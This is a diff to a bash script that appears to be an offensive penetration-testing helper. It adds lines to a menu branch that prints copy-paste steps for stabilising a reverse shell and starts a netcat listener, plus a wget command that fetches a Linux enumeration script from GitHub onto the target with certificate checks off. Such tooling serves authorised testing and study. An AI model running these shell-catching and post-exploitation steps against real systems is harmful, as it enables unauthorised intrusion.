@@ -1465,6 +1465,8 @@ while true; do
 			echo "[COPY+PASTE] python -c 'import pty; pty.spawn(\"/bin/bash\")'"
 			echo "[COPY+PASTE] TERM=xterm"
 			echo "After connection to remote host, in this machine use CTRL+z and digit 'stty raw -echo'"
+			echo "if you want use linuxallenum, copy and paste this script for the last step"
+			echo "[COPY+PASTE] wget --no-check-certificate \"https://raw.githubusercontent.com/FabioDefilippo/linuxallenum/master/linuxallenum.sh\""
 			nc -lvnp $PORTA
 		fi
 	;;
